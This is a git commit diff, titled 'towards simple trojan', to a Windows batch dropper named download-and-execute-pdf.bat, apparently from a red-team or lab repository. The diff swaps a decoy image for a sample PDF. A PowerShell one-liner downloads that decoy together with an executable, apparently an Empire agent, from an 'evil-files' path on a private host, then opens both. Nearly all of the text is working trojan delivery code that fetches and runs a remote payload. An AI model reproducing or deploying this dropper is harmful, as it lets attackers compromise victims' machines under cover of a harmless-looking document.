a02e2b324ea3e10198eb97e3aa2f1a753b939545
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-07-12 22:35:57 +0200

    towards simple trojan

--- deliver/download-and-execute-pdf.bat
+++ deliver/download-and-execute-pdf.bat
@@ -1,6 +1,8 @@
 @echo off
 
-set files='https://www.rd.com/wp-content/uploads/2021/03/GettyImages-140594401-1-scaled.jpg','https://192.168.122.108/evil-files/empire_http_8080.exe'
+set files='https://filesamples.com/samples/document/pdf/sample3.pdf','https://192.168.122.108/evil-files/empire_http_8080.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+
 
